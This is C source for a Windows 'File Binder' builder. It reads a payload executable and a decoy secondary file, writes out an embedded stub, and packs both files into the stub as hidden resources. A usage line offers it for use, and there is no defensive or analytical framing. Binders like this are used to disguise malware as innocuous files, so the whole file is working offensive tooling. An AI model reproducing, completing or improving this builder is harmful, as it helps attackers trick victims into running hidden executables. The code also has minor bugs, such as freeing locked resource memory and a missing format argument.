
#include <stdio.h>
#include <stdarg.h>
#include <windows.h>
#include <Shlwapi.h>

#pragma comment(lib, "Shlwapi.lib")

#define PAYLOAD_BUFFER_RSRC_ID 10
#define PAYLOAD_EXTENSION_RSRC_ID (PAYLOAD_BUFFER_RSRC_ID + 1)
#define SECONDARY_BUFFER_RSRC_ID 20
#define SECONDARY_EXTENSION_RSRC_ID (SECONDARY_BUFFER_RSRC_ID + 1)

typedef struct _FileStruct {
	PBYTE pBuffer;
	DWORD dwFileSize;
	LPSTR lpExtension;
	DWORD dwExtensionLength;
} FileStruct, *pFileStruct;

VOID Debug(LPCSTR fmt, ...) {
	va_list args;
	va_start(args, fmt);

	vprintf(fmt, args);

	va_end(args);
}

FileStruct *LoadFile(LPCSTR szFileName) {
	Debug("Loading %s...\n", szFileName);

	Debug("Initializing struct...\n");
	FileStruct *fs = (FileStruct *)malloc(sizeof(*fs));
	if (fs == NULL) {
		Debug("Create %s file structure error: %lu\n", szFileName, GetLastError());
		return NULL;
	}

	Debug("Initializing file...\n");
	// get file handle to file
	HANDLE hFile = CreateFile(szFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		Debug("Create file error: %lu\n", GetLastError());
		free(fs);
		return NULL;
	}

	Debug("Extracting extension...\n");
	fs->lpExtension = PathFindExtension(szFileName);
	fs->dwExtensionLength = strlen(fs->lpExtension);
	Debug("Extension: %s\n", fs->lpExtension);

	Debug("Retrieving file size...\n");
	fs->dwFileSize = GetFileSize(hFile, NULL);
	if (fs->dwFileSize == INVALID_FILE_SIZE) {
		Debug("Get file size error: %lu\n", GetLastError());
		CloseHandle(hFile);
		free(fs);
		return NULL;
	}

	fs->pBuffer = (PBYTE)malloc(fs->dwFileSize);
	if (fs->pBuffer == NULL) {
		Debug("Create buffer error: %lu\n", GetLastError());
		CloseHandle(hFile);
		free(fs);
		return NULL;
	}

	Debug("Reading file contents...\n");
	DWORD dwRead = 0;
	if (ReadFile(hFile, fs->pBuffer, fs->dwFileSize, &dwRead, NULL) == FALSE) {
		Debug("Read file error: %lu\n", GetLastError());
		CloseHandle(hFile);
		free(fs);
		return NULL;
	}
	Debug("Read 0x%08x bytes\n\n", dwRead);

	// clean up
	CloseHandle(hFile);

	return fs;
}

BOOL UpdateStub(LPCSTR szFileName, FileStruct *fs, int nRsrcId) {
	// start updating stub's resources
	HANDLE hUpdate = BeginUpdateResource(szFileName, FALSE);
	// add file as a resource to stub
	if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(nRsrcId), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs->pBuffer, fs->dwFileSize) == FALSE) {
		Debug("Update resource error: %lu\n", GetLastError());
		return FALSE;
	}

	if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(nRsrcId + 1), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs->lpExtension, fs->dwExtensionLength) == FALSE) {
		Debug("Update resource error: %lu\n", GetLastError());
		return FALSE;
	}

	EndUpdateResource(hUpdate, FALSE);

	return TRUE;
}

BOOL BuildStub(LPCSTR szFileName, FileStruct *fsPayload, FileStruct *fsSecondary) {
	Debug("Building stub: %s...\n", szFileName);

	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(1), "STUB");
	if (hRsrc == NULL) {
		Debug("Find resource error: %lu\n", GetLastError());
		return FALSE;
	}
	DWORD dwSize = SizeofResource(NULL, hRsrc);

	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		Debug("Load resource error: %lu\n", GetLastError());
		return FALSE;
	}


	PBYTE pBuffer = (PBYTE)LockResource(hGlobal);
	if (pBuffer == NULL) {
		Debug("Lock resource error: %lu\n", GetLastError());
		return FALSE;
	}

	Debug("Creating stub file...\n");
	HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		Debug("Create stub error: %lu\n", GetLastError());
		free(pBuffer);
		return FALSE;
	}

	Debug("Writing buffer content to stub...\n");
	DWORD dwWritten = 0;
	if (WriteFile(hFile, pBuffer, dwSize, &dwWritten, NULL) == FALSE) {
		Debug("Write payload to stub error: %lu\n", GetLastError());
		CloseHandle(hFile);
		free(pBuffer);
		return FALSE;
	}
	Debug("Wrote 0x%08x bytes\n\n");

	CloseHandle(hFile);

	Debug("Updating stub with payload...\n");
	if (UpdateStub(szFileName, fsPayload, PAYLOAD_BUFFER_RSRC_ID) == FALSE)
		return FALSE;

	Debug("Updating stub with secondary file...\n");
	if (UpdateStub(szFileName, fsSecondary, SECONDARY_BUFFER_RSRC_ID) == FALSE)
		return FALSE;

	return TRUE;
}

int main(int argc, char *argv[]) {
	Debug("File Binder Project Copyright (C) 2016 93aef0ce4dd141ece6f5\n\n");
	if (argc < 4) {
		Debug("Usage: %s [PAYLOAD EXECUTABLE] [SECONDARY FILE] [OUTPUT FILE]", argv[0]);
		return 1;
	}

	// load file information into structs
	FileStruct *fsPayload = LoadFile(argv[1]);
	if (fsPayload == NULL) return 1;
	FileStruct *fsSecondary = LoadFile(argv[2]);
	if (fsSecondary == NULL) return 1;

	if (BuildStub(argv[3], fsPayload, fsSecondary) == FALSE)
		return 1;

	free(fsPayload);
	free(fsSecondary);

	Debug("\nDone\n");

	return 0;
}
